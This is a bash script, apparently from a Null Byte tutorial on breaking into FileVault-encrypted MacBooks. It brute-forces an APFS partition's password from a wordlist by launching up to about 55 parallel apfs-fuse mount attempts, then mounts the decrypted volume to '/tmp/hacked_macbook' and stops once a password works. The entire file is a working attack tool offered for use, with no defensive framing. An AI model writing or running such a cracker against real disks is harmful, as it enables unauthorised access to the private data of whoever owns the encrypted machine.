#!/bin/bash

# https://null-byte.wonderhowto.com/how-to/hacking-macos-break-into-macbook-encrypted-with-filevault-0185177/

# checks to ensure all 3 args are present
if [[ ! $3 ]]; then
    echo -e "\nusage: $ ./script.sh /dev/sdaX passwords.list -killswitch\n"
    exit 0
fi

# wordlist variable
password="${2:--}"

# wordlist line count, for fancy output
line_total="$(wc -l ${2:--} | awk '{print $1}')"

# because processes get moved to the background, i needed a simple way
# to grep the parent PID to kill all apfs-fuse processes. this can be
# done more elegantly, but would require more work
killswitch="$(ps aux | grep -i [k]illswitch | head -n1 | awk '{print $2}')"

# user input; mount partition name e.g., /dev/sdaX
mount_partition="$1"

# if password is guessed, mount partion to this directory
mount_dir='/tmp/hacked_macbook'

# create "hacked_macbook" directory if it doesn't exist
if [[ ! -d "$mount_dir" ]]; then
    mkdir "$mount_dir"
fi

# max concurrent apfs-fuse processes. set at 55. WARNING! i definitely
# crashed my macbook a few times playing with this value. after about
# 50 concurrent PIDs, i didnt notice an improvement in processing
# speed. benchmarked using `time`
function thread_max {
  while [ $(jobs | wc -l) -gt 55 ]; do
    sleep 3
  done
}

count='0'

# a while loop to interate through supplied passwords
while read password; do
    # count the number of passwords; fancy output
    count="$[count+1]"
    # emulate some kind of progress information; fancy output
    echo "[-] Trying "$count"/"$line_total": "$password""
    # apfs-fuse binary path is hardcoded. if apfs-fuse directory is not
    # located in /root change the below line. this line will silently
    # execute apfs-fuse with a password from the wordlist. if the password
    # is found it will `kill` the parent process and stop the bruteforce attack
    thread_max; /root/apfs-fuse/build/bin/apfs-fuse -r "$password" "$mount_partition" "$mount_dir" >/dev/null 2>&1 &&\
    echo -e "\n[+] Password is: "$password"\n" && kill "$killswitch" || continue &
done < "$password"